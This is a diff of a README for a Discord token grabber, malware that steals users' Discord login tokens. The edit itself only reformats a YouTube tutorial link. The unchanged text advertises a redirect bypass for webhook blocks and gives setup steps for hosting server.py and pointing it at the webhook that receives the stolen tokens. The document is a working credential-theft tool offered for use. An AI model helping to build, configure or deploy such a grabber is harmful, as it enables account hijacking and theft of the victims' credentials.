@@ -1,6 +1,9 @@
 <h2 align="center">This is a JavaScript + Python Discord token grabber with a redirect bypass to overcome webhook request blocks.</h2>
 
-## Setup [youtube tutorial](https://www.youtube.com/channel/UCqUsj2ghXj2UzR9UikgesLg)
+## Setup
+
+#### [youtube tutorial](https://www.youtube.com/channel/UCqUsj2ghXj2UzR9UikgesLg)
+
 
 1. Upload the [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) script to a hosting service such as [Replit](https://replit.com/) or any other hosting service of your choice.
 2. Replace the text [`YOUR WEBHOOK`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py#L5) in the [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) script with the webhook you want the token to be sent to.
